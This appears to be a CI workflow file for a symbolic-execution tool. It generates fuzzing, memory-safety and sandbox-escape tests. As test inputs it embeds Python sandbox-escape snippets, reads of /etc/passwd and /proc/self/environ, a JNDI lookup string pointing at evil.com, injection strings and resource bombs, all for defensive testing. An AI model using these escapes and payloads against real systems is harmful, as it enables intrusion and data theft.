# SPDX-License-Identifier: MIT
# Copyright (c) 2025 Symbolic MCP Contributors

name: Advanced Security Testing

on:
  # Run on security-sensitive events
  push:
    branches: [ main ]
    paths:
      - 'main.py'
      - 'tests/test_security_*.py'
      - 'requirements.txt'
  pull_request:
    branches: [ main ]
    paths:
      - 'main.py'
      - 'tests/test_security_*.py'
      - 'requirements.txt'
  schedule:
    # Run comprehensive security tests daily at 2 AM UTC
    - cron: '0 2 * * *'
  workflow_dispatch:
    inputs:
      test_type:
        description: 'Type of security tests to run'
        required: false
        default: 'all'
        type: choice
        options:
          - all
          - cve-simulation
          - fuzzing
          - memory-safety
          - sandbox-escape

env:
  # Security testing environment variables
  SECURITY_TEST_TIMEOUT: 300
  FUZZING_DURATION: 120
  MEMORY_LIMIT_MB: 2048
  SANDBOX_TESTING: true

jobs:
  # === CVE-003-001 SPECIFIC TESTING ===

  cve-simulation:
    name: üéØ CVE-003-001 Simulation
    runs-on: ubuntu-latest
    if: github.event.inputs.test_type == 'all' || github.event.inputs.test_type == 'cve-simulation' || github.event.inputs.test_type == ''
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install pytest pytest-timeout
          pip install -r requirements.txt

      - name: Create CVE Test Harness
        run: |
          cat > test_cve_simulation.py << 'EOF'
          """
          CVE-003-001 Simulation Test Harness

          This test specifically simulates the conditions that led to CVE-003-001
          and verifies that the fix is effective.
          """

          import pytest
          import sys
          import os
          import tempfile
          import importlib.util
          from typing import Dict, Any

          # Add the project root to the path
          sys.path.insert(0, os.getcwd())

          import main


          def test_cve_003_001_sandbox_escape_prevention():
              """Test that CVE-003-001 sandbox escape is prevented"""

              # This is the exact exploit pattern from CVE-003-001
              exploit_code = '''
          # Attempt to break out of RestrictedPython sandbox
          import builtins
          import types

          # Try to access __import__ through backdoors
          try:
              getattr = builtins.__dict__['getattr']
              __import__ = getattr(builtins, '__import__')
              os_module = __import__('os')
              os_module.system('echo "SANDVOX_ESCAPE_SUCCESS"')
          except:
              pass

          # Alternative escape attempts
          try:
              eval("__import__('os').system('echoALT_ESCAPE_SUCCESS')")
          except:
              pass

          # Try through type manipulation
          try:
              object_type = type(object())
              getattribute = object_type.__getattribute__
              import_func = getattribute(builtins, '__import__')
              os_module = import_func('os')
              os_module.system('echoTYPE_ESCAPE_SUCCESS')
          except:
              pass
          '''

              result = main.analyze_symbolic_execution(
                  code=exploit_code,
                  options={
                      'timeout': 10,
                      'memory_limit': 512
                  }
              )

              # Verify no sandbox escape occurred
              result_str = str(result)

              # Check for any signs of successful escape
              escape_indicators = [
                  'SANDVOX_ESCAPE_SUCCESS',
                  'ALT_ESCAPE_SUCCESS',
                  'TYPE_ESCAPE_SUCCESS',
                  'subprocess',
                  'os.system',
                  'popen'
              ]

              for indicator in escape_indicators:
                  assert indicator not in result_str.lower(), f"Sandbox escape detected: {indicator}"

              print("‚úÖ CVE-003-001 sandbox escape properly blocked")


          def test_cve_003_001_import_blocking():
              """Test that dangerous imports are properly blocked"""

              dangerous_imports = [
                  'import os',
                  'import sys',
                  'import subprocess',
                  'import socket',
                  'import threading',
                  'import multiprocessing',
                  'from os import system',
                  'from subprocess import run',
                  'import threading',
                  'import signal'
              ]

              for import_stmt in dangerous_imports:
                  test_code = f'''
          try:
              {import_stmt}
              # Try to use the imported module
              if 'os' in '{import_stmt}':
                  os.system('whoami')
              elif 'subprocess' in '{import_stmt}':
                  subprocess.run(['whoami'], capture_output=True)
          except:
              pass
          '''

                  result = main.analyze_symbolic_execution(
                      code=test_code,
                      options={'timeout': 5}
                  )

                  # Verify dangerous operations were blocked
                  result_str = str(result).lower()

                  # Should not contain evidence of successful dangerous operations
                  dangerous_indicators = ['system(', 'subprocess.run', 'popen(']

                  for indicator in dangerous_indicators:
                      if indicator in result_str:
                          pytest.fail(f"Dangerous operation not blocked: {indicator} in {import_stmt}")

              print("‚úÖ All dangerous imports properly blocked")


          def test_cve_003_001_symbolic_execution_isolation():
              """Test that symbolic execution doesn't escape sandbox"""

              # Code that tries to manipulate symbolic execution internals
              manipulative_code = '''
          # Try to access and modify CrossHair internals
          import sys
          import inspect

          # Get current frame and try to escape
          frame = inspect.currentframe()
          try:
              globals_dict = frame.f_globals
              __builtins__ = globals_dict['__builtins__']
              import os
              os.system('echo FRAME_ESCAPE_SUCCESS')
          except:
              pass

          # Try through sys.modules manipulation
          try:
              sys.modules['os'].__dict__['system']('echo MODULES_ESCAPE_SUCCESS')
          except:
              pass
          '''

              result = main.analyze_symbolic_execution(
                  code=manipulative_code,
                  options={'timeout': 10}
              )

              result_str = str(result)

              escape_indicators = [
                  'FRAME_ESCAPE_SUCCESS',
                  'MODULES_ESCAPE_SUCCESS'
              ]

              for indicator in escape_indicators:
                  assert indicator not in result_str, f"Symbolic execution escape detected: {indicator}"

              print("‚úÖ Symbolic execution properly isolated")
          EOF

      - name: Run CVE Simulation Tests
        run: |
          timeout ${{ env.SECURITY_TEST_TIMEOUT }} pytest test_cve_simulation.py -v --tb=short

      - name: Test Memory Safety During Attacks
        run: |
          python -c "
          import psutil
          import os
          import main
          import time

          process = psutil.Process()
          initial_memory = process.memory_info().rss / 1024 / 1024  # MB

          print(f'Initial memory: {initial_memory:.2f} MB')

          # Run multiple potentially malicious analyses
          for i in range(10):
              malicious_code = '''
          # Code designed to cause memory issues
          large_list = [i for i in range(1000000)]
          try:
              import os
              os.system('echo attempt')
          except:
              pass
          '''

              try:
                  result = main.analyze_symbolic_execution(
                      code=malicious_code,
                      options={'timeout': 5, 'memory_limit': 256}
                  )
                  time.sleep(0.1)
              except Exception as e:
                  print(f'Expected security block: {e}')

          final_memory = process.memory_info().rss / 1024 / 1024  # MB
          print(f'Final memory: {final_memory:.2f} MB')
          print(f'Memory growth: {final_memory - initial_memory:.2f} MB')

          # Memory should not have grown excessively
          assert final_memory - initial_memory < ${{ env.MEMORY_LIMIT_MB }}, \
              f'Memory leak detected: {final_memory - initial_memory:.2f} MB growth'

          print('‚úÖ No memory leaks during attack scenarios')
          "

      - name: Upload CVE Test Results
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: cve-simulation-results
          path: |
            test_cve_simulation.py
            cve-test-logs.txt
          retention-days: 30

  # === FUZZING TESTS ===

  fuzzing:
    name: üß© Security Fuzzing
    runs-on: ubuntu-latest
    if: github.event.inputs.test_type == 'all' || github.event.inputs.test_type == 'fuzzing' || github.event.inputs.test_type == ''
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Install fuzzing dependencies
        run: |
          python -m pip install --upgrade pip
          pip install atheris
          pip install -r requirements.txt

      - name: Create Fuzzing Harness
        run: |
          cat > fuzz_test.py << 'EOF'
          """
          Security Fuzzing Harness for Symbolic MCP

          Uses Atheris to fuzz the symbolic execution engine with malformed
          and potentially malicious inputs to find crashes and vulnerabilities.
          """

          import sys
          import atheris
          import os
          sys.path.insert(0, os.getcwd())

          import main


          def TestOneInput(data):
              """Fuzz test function for symbolic execution"""
              try:
                  # Convert fuzz input to Python code
                  try:
                      fuzz_code = data.decode('utf-8', errors='ignore')
                  except:
                      fuzz_code = str(data)

                  # Limit code length to prevent timeouts
                  if len(fuzz_code) > 1000:
                      fuzz_code = fuzz_code[:1000]

                  # Ensure it's valid-ish Python by wrapping in try/except
                  test_code = f'''
          try:
          {fuzz_code}
          except:
              pass
          '''

                  # Run symbolic execution with tight limits
                  result = main.analyze_symbolic_execution(
                      code=test_code,
                      options={
                          'timeout': 1,  # Very short timeout for fuzzing
                          'memory_limit': 64,  # Low memory limit
                          'max_depth': 10
                      }
                  )

              except MemoryError:
                  # Expected during fuzzing
                  raise
              except Exception as e:
                  # Log unexpected exceptions but don't fail the fuzz test
                  if 'SecurityViolation' not in str(e) and 'Restricted' not in str(e):
                      print(f'Unexpected fuzzing error: {e}')


          def main_fuzz():
              """Main fuzzing function"""
              # Setup atheris
              atheris.Setup(sys.argv, TestOneInput)

              # Run with a time limit
              atheris.Fuzz(timeout=${{ env.FUZZING_DURATION }})


          if __name__ == '__main__':
              main_fuzz()
          EOF

      - name: Run Security Fuzzing
        run: |
          timeout $(( ${{ env.FUZZING_DURATION }} + 30 )) python fuzz_test.py || \
          echo "Fuzzing completed (timeout expected)"

      - name: Create Edge Case Inputs
        run: |
          cat > edge_cases.py << 'EOF'
          """
          Test known edge cases that could cause security issues
          """

          import main
          import time

          edge_cases = [
              # Extremely long strings
              'x' * 100000,

              # Unicode edge cases
              '\x00\x01\x02\x03\x04\x05',
              '‡≤†_‡≤†',  # Non-ASCII
              'ùîòùî´ùî¶ùî†ùî¨ùî°ùî¢',  # Mathematical symbols

              # Python syntax edge cases
              'lambda: Œª',
              'def ùõº(): pass',
              'import \ud83d\udca9',

              # Control characters
              'x\x1b[31mx',  # ANSI escape
              '\x07\x08\x0b\x0c',  # Bells and controls

              # Nested structures
              'a' + '(' * 1000 + ')' * 1000,
              '[' * 500 + ']' * 500,
              '{' * 250 + '}' * 250,

              # Malformed unicode
              '\xc0\x80',  # Overlong encoding
              '\xef\xbb\xbf',  # BOM
              '\xff\xfe',  # Invalid UTF-8

              # Path traversal attempts
              '../../../etc/passwd',
              '..\\..\\..\\windows\\system32',
              '/proc/self/environ',
              'file:///etc/passwd',

              # Injection attempts
              "'; DROP TABLE users; --",
              '${jndi:ldap://evil.com/a}',
              '{{7*7}}',
              '<%=7*7%>',

              # Integer overflow attempts
              str(2**63),
              str(2**1024),
              str(10**100),

              # Recursion bombs
              'def f(): return f()',
              '(lambda x: x(x))(lambda x: x(x))',

              # Magic methods
              '__import__("os").system("whoami")',
              '__builtins__.__dict__["__import__"]("os")',
              '__class__.__bases__[0].__subclasses__()',

              # Eval-like constructs
              'eval("1+1")',
              'exec("print(1)")',
              'compile("1+1", "<string>", "eval")',
              '__import__("builtins").eval("1+1")',
          ]

          print('Testing edge cases...')
          for i, case in enumerate(edge_cases):
              try:
                  test_code = f'''
          try:
              x = """{case}"""
              # Try various operations
              str(x)
              repr(x)
              len(x)
          except:
              pass
          '''

                  result = main.analyze_symbolic_execution(
                      code=test_code,
                      options={'timeout': 2, 'memory_limit': 128}
                  )

                  print(f'Edge case {i+1}/{len(edge_cases)}: OK')

              except Exception as e:
                  print(f'Edge case {i+1}: {e}')

              time.sleep(0.1)  # Prevent overwhelming

          print('‚úÖ All edge cases handled safely')
          EOF

      - name: Test Edge Cases
        run: |
          timeout 60 python edge_cases.py

      - name: Upload Fuzzing Results
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: fuzzing-results
          path: |
            fuzz_test.py
            edge_cases.py
            fuzzing-logs.txt
          retention-days: 30

  # === MEMORY SAFETY TESTING ===

  memory-safety:
    name: üíæ Memory Safety Testing
    runs-on: ubuntu-latest
    if: github.event.inputs.test_type == 'all' || github.event.inputs.test_type == 'memory-safety' || github.event.inputs.test_type == ''
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Install memory profiling tools
        run: |
          python -m pip install --upgrade pip
          pip install memory-profiler objgraph pympler
          pip install -r requirements.txt

      - name: Create Memory Safety Tests
        run: |
          cat > memory_safety_test.py << 'EOF'
          """
          Memory Safety and Leak Detection Tests
          """

          import sys
          import os
          import time
          import gc
          import psutil
          from memory_profiler import profile
          import objgraph
          from pympler import muppy, summary

          sys.path.insert(0, os.getcwd())
          import main


          @profile
          def test_memory_with_symbolic_execution():
              """Test memory usage during symbolic execution"""
              process = psutil.Process()
              initial_objects = len(gc.get_objects())
              initial_memory = process.memory_info().rss / 1024 / 1024

              print(f'Initial memory: {initial_memory:.2f} MB')
              print(f'Initial objects: {initial_objects}')

              # Run symbolic execution on memory-intensive code
              memory_intensive_code = '''
          def recursive_function(n):
              if n > 0:
                  return recursive_function(n-1) + n
              return 0

          # Try to create lots of objects
          result = recursive_function(100)
          large_list = [i for i in range(1000)]
          dict_data = {f'key_{i}': f'value_{i}' for i in range(1000)}
          '''

              # Run multiple times to detect leaks
              for iteration in range(5):
                  try:
                      result = main.analyze_symbolic_execution(
                          code=memory_intensive_code,
                          options={'timeout': 10, 'memory_limit': 512}
                      )

                      # Force garbage collection
                      gc.collect()

                      current_memory = process.memory_info().rss / 1024 / 1024
                      current_objects = len(gc.get_objects())

                      print(f'Iteration {iteration+1}: {current_memory:.2f} MB, {current_objects} objects')

                      # Check for excessive memory growth
                      if current_memory - initial_memory > 100:  # 100MB threshold
                          print(f'‚ö†Ô∏è Potential memory leak: {current_memory - initial_memory:.2f} MB growth')

                  except Exception as e:
                      print(f'Iteration {iteration+1} error: {e}')

                  time.sleep(1)

              final_memory = process.memory_info().rss / 1024 / 1024
              final_objects = len(gc.get_objects())

              print(f'Final memory: {final_memory:.2f} MB')
              print(f'Final objects: {final_objects}')
              print(f'Total memory growth: {final_memory - initial_memory:.2f} MB')
              print(f'Total object growth: {final_objects - initial_objects}')

              return final_memory - initial_memory


          def test_memory_with_attacks():
              """Test memory safety during attack scenarios"""
              process = psutil.Process()

              # Test various attack scenarios
              attack_scenarios = [
                  # Recursion bomb
                  '''
          def bomb():
              return bomb()
          bomb()
          ''',

                  # Memory allocation bomb
                  '''
          data = []
          while True:
              data.append('x' * 1000000)
          ''',

                  # Object creation bomb
                  '''
          objects = []
          class ExpensiveObject:
              def __init__(self):
                  self.data = 'x' * 10000

          while True:
              objects.append(ExpensiveObject())
          ''',

                  # Import bomb
                  '''
          for i in range(1000):
              try:
                  __import__(f'module_{i}')
              except:
                  pass
          ''',
              ]

              for i, attack_code in enumerate(attack_scenarios):
                  try:
                      initial_memory = process.memory_info().rss / 1024 / 1024

                      result = main.analyze_symbolic_execution(
                          code=attack_code,
                          options={'timeout': 5, 'memory_limit': 256}
                      )

                      final_memory = process.memory_info().rss / 1024 / 1024
                      memory_growth = final_memory - initial_memory

                      print(f'Attack {i+1}: {memory_growth:.2f} MB growth')

                      # Memory growth should be controlled
                      assert memory_growth < 50, f'Attack caused excessive memory growth: {memory_growth:.2f} MB'

                  except Exception as e:
                      print(f'Attack {i+1} blocked: {e}')


          def main_test():
              """Run all memory safety tests"""
              print('=== Memory Safety Testing ===')

              try:
                  growth = test_memory_with_symbolic_execution()
                  assert growth < ${{ env.MEMORY_LIMIT_MB }}, f'Excessive memory growth: {growth:.2f} MB'
                  print('‚úÖ Symbolic execution memory safety: PASS')
              except Exception as e:
                  print(f'‚ùå Symbolic execution memory safety: FAIL - {e}')
                  return 1

              try:
                  test_memory_with_attacks()
                  print('‚úÖ Attack scenario memory safety: PASS')
              except Exception as e:
                  print(f'‚ùå Attack scenario memory safety: FAIL - {e}')
                  return 1

              # Final object graph analysis
              try:
                  all_objects = muppy.get_objects()
                  sum1 = summary.summarize(all_objects)
                  summary.print_(sum1[:10])  # Top 10 object types
                  print('‚úÖ Object graph analysis: PASS')
              except Exception as e:
                  print(f'‚ö†Ô∏è Object graph analysis: {e}')

              return 0


          if __name__ == '__main__':
              exit(main_test())
          EOF

      - name: Run Memory Safety Tests
        run: |
          timeout 300 python memory_safety_test.py

      - name: Generate Memory Profile
        run: |
          python -m memory_profiler memory_safety_test.py > memory-profile.txt || true

      - name: Upload Memory Safety Results
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: memory-safety-results
          path: |
            memory_safety_test.py
            memory-profile.txt
            memory-profile-*.png
          retention-days: 30

  # === SANDBOX ESCAPE TESTING ===

  sandbox-escape:
    name: üèõÔ∏è Sandbox Escape Testing
    runs-on: ubuntu-latest
    if: github.event.inputs.test_type == 'all' || github.event.inputs.test_type == 'sandbox-escape' || github.event.inputs.test_type == ''
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install pytest
          pip install -r requirements.txt

      - name: Create Sandbox Escape Tests
        run: |
          cat > sandbox_escape_test.py << 'EOF'
          """
          Comprehensive Sandbox Escape Testing

          Tests various methods attackers might use to escape the symbolic
          execution sandbox and access system resources.
          """

          import sys
          import os
          sys.path.insert(0, os.getcwd())

          import main
          import tempfile
          import subprocess
          import signal
          import threading
          import time


          def test_filesystem_access():
              """Test that filesystem access is blocked"""

              dangerous_file_ops = [
                  'open("/etc/passwd", "r")',
                  'open("../../../etc/passwd", "r")',
                  'with open("/proc/self/environ") as f: f.read()',
                  'open(__file__, "r")',
                  'open("test", "w").write("test")',
                  'os.listdir("/")',
                  'os.listdir("../" * 100)',
                  'os.walk("/")',
                  'os.path.abspath("/")',
                  'os.path.realpath("/etc/passwd")',
                  'os.access("/etc/passwd", os.R_OK)',
                  'os.stat("/etc/passwd")',
                  'os.chmod("/etc/passwd", 0o777)',
              ]

              for op in dangerous_file_ops:
                  test_code = f'''
          try:
              result = {op}
              print(f"SUCCESS: {{result}}")
          except Exception as e:
              print(f"BLOCKED: {{e}}")
          '''

                  result = main.analyze_symbolic_execution(
                      code=test_code,
                      options={'timeout': 5}
                  )

                  result_str = str(result)

                  # Should not contain SUCCESS indicators
                  assert 'SUCCESS:' not in result_str, f"Filesystem access not blocked: {op}"
                  assert 'root:x' not in result_str, f"File content exposed: {op}"


          def test_process_execution():
              """Test that process execution is blocked"""

              dangerous_process_ops = [
                  'subprocess.run(["whoami"], capture_output=True)',
                  'subprocess.Popen(["ls", "/"], capture_output=True)',
                  'os.system("whoami")',
                  'os.popen("whoami").read()',
                  'os.spawnlp(os.P_WAIT, "ls", "ls", "/")',
                  'os.execv("/bin/sh", ["sh", "-c", "whoami"])',
                  'eval("__import__(\'subprocess\').run([\'whoami\'])")',
                  'exec("__import__(\'os\').system(\'whoami\')")',
              ]

              for op in dangerous_process_ops:
                  test_code = f'''
          import os
          try:
              result = {op}
              print(f"SUCCESS: {{result}}")
          except Exception as e:
              print(f"BLOCKED: {{e}}")
          '''

                  result = main.analyze_symbolic_execution(
                      code=test_code,
                      options={'timeout': 5}
                  )

                  result_str = str(result)

                  # Should not contain process execution results
                  assert 'SUCCESS:' not in result_str, f"Process execution not blocked: {op}"
                  assert 'root' not in result_str and 'ubuntu' not in result_str, f"Process output exposed: {op}"


          def test_network_access():
              """Test that network access is blocked"""

              dangerous_network_ops = [
                  'socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("google.com", 80))',
                  'urllib.request.urlopen("http://google.com")',
                  'requests.get("http://google.com")',
                  'socket.gethostbyname("google.com")',
                  'socket.create_connection(("google.com", 80))',
              ]

              for op in dangerous_network_ops:
                  test_code = f'''
          import socket
          try:
              result = {op}
              print(f"SUCCESS: {{result}}")
          except Exception as e:
              print(f"BLOCKED: {{e}}")
          '''

                  result = main.analyze_symbolic_execution(
                      code=test_code,
                      options={'timeout': 5}
                  )

                  result_str = str(result)

                  # Should not contain successful network access
                  assert 'SUCCESS:' not in result_str, f"Network access not blocked: {op}"


          def test_advanced_escape_techniques():
              """Test advanced sandbox escape techniques"""

              advanced_attacks = [
                  # Frame manipulation
                  '''
          import sys
          frame = sys._getframe()
          globals_dict = frame.f_globals
          __builtins__ = globals_dict['__builtins__']
          import os
          os.system('whoami')
          ''',

                  # Metaclass manipulation
                  '''
          class EvilMeta(type):
              def __getattribute__(cls, name):
                  if name == '__import__':
                      return lambda x: __import__('os')
                  return super().__getattribute__(name)

          class Evil(metaclass=EvilMeta):
              pass

          Evil.__import__('os').system('whoami')
          ''',

                  # Descriptor protocol abuse
                  '''
          class ImportDescriptor:
              def __get__(self, obj, objtype):
                  return __import__('os')
              def __set__(self, obj, value):
                  pass

          class Module:
              __import__ = ImportDescriptor()

          Module.__import__('os').system('whoami')
          ''',

                  # Magic method abuse
                  '''
          class Exploit:
              def __getattr__(self, name):
                  if name == '__import__':
                      return lambda x: __import__('os')
                  raise AttributeError(name)

          exploit = Exploit()
          exploit.__import__('os').system('whoami')
          ''',

                  # GC manipulation
                  '''
          import gc
          objects = gc.get_objects()
          for obj in objects:
              if hasattr(obj, '__builtins__'):
                  obj.__builtins__['__import__('os')'].system('whoami')
                  break
          ''',
              ]

              for i, attack in enumerate(advanced_attacks):
                  test_code = f'''
          try:
          {attack}
              print(f"ESCAPE_SUCCESS")
          except Exception as e:
              print(f"BLOCKED: {{e}}")
          '''

                  result = main.analyze_symbolic_execution(
                      code=test_code,
                      options={'timeout': 10}
                  )

                  result_str = str(result)

                  # Should not contain successful escape
                  assert 'ESCAPE_SUCCESS' not in result_str, f"Advanced escape not blocked: attack {i+1}"


          def main_test():
              """Run all sandbox escape tests"""
              print('=== Sandbox Escape Testing ===')

              tests = [
                  ('Filesystem Access', test_filesystem_access),
                  ('Process Execution', test_process_execution),
                  ('Network Access', test_network_access),
                  ('Advanced Escape Techniques', test_advanced_escape_techniques),
              ]

              passed = 0
              total = len(tests)

              for test_name, test_func in tests:
                  try:
                      test_func()
                      print(f'‚úÖ {test_name}: PASS')
                      passed += 1
                  except Exception as e:
                      print(f'‚ùå {test_name}: FAIL - {e}')

              print(f'\\nSandbox Escape Tests: {passed}/{total} passed')
              return 0 if passed == total else 1


          if __name__ == '__main__':
              exit(main_test())
          EOF

      - name: Run Sandbox Escape Tests
        run: |
          timeout 120 python sandbox_escape_test.py

      - name: Upload Sandbox Escape Results
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: sandbox-escape-results
          path: |
            sandbox_escape_test.py
            sandbox-test-logs.txt
          retention-days: 30

  # === SECURITY TEST SUMMARY ===

  security-summary:
    name: üìä Security Test Summary
    runs-on: ubuntu-latest
    needs: [cve-simulation, fuzzing, memory-safety, sandbox-escape]
    if: always()
    steps:
      - name: Download all security test results
        uses: actions/download-artifact@v4
        with:
          path: security-artifacts/

      - name: Generate Security Report
        run: |
          python -c "
          import os
          from pathlib import Path
          import json
          from datetime import datetime

          # Analyze test results
          results = {}

          # Check each test category
          categories = {
              'cve-simulation': 'CVE-003-001 Simulation',
              'fuzzing': 'Security Fuzzing',
              'memory-safety': 'Memory Safety',
              'sandbox-escape': 'Sandbox Escape'
          }

          for category, display_name in categories.items():
              artifact_path = Path(f'security-artifacts/{category}-results')
              if artifact_path.exists():
                  # Simple heuristic: if artifacts exist, tests ran
                  results[display_name] = 'COMPLETED'
              else:
                  results[display_name] = 'SKIPPED'

          # Generate report
          report = {
              'timestamp': datetime.now().isoformat(),
              'test_results': results,
              'overall_status': 'PASS' if all(v == 'COMPLETED' for v in results.values()) else 'PARTIAL'
          }

          # Create markdown summary
          markdown = f'''# Security Testing Report

          **Generated:** {report['timestamp']}
          **Overall Status:** {report['overall_status']}

          ## Test Results

          | Test Category | Status |
          |---------------|--------|'''

          for category, status in results.items():
              emoji = '‚úÖ' if status == 'COMPLETED' else '‚è≠Ô∏è'
              markdown += f'\\n| {category} | {emoji} {status} |'

          markdown += '''

          ## Security Coverage

          - **CVE-003-001 Simulation**: Tests specific vulnerability scenarios
          - **Security Fuzzing**: Randomized input testing with Atheris
          - **Memory Safety**: Memory leak and overflow detection
          - **Sandbox Escape**: Comprehensive escape technique testing

          ## Recommendations

          - Review any SKIPPED test categories
          - Monitor PASS status for all security tests
          - Address any security findings immediately
          - Consider expanding test coverage based on emerging threats
          '''

          with open('security-summary.md', 'w') as f:
              f.write(markdown)

          with open('security-report.json', 'w') as f:
              json.dump(report, f, indent=2)

          print(markdown)
          "

      - name: Upload Security Summary
        uses: actions/upload-artifact@v4
        with:
          name: security-summary
          path: |
            security-summary.md
            security-report.json
          retention-days: 90

      - name: Comment on Security Findings
        if: github.event_name == 'pull_request'
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');

            try {
              const summary = fs.readFileSync('security-summary.md', 'utf8');

              github.rest.issues.createComment({
                issue_number: context.issue.number,
                owner: context.repo.owner,
                repo: context.repo.repo,
                body: `## üîí Security Testing Results\n\n${summary}`
              });
            } catch (error) {
              console.log('Could not read security summary:', error.message);
            }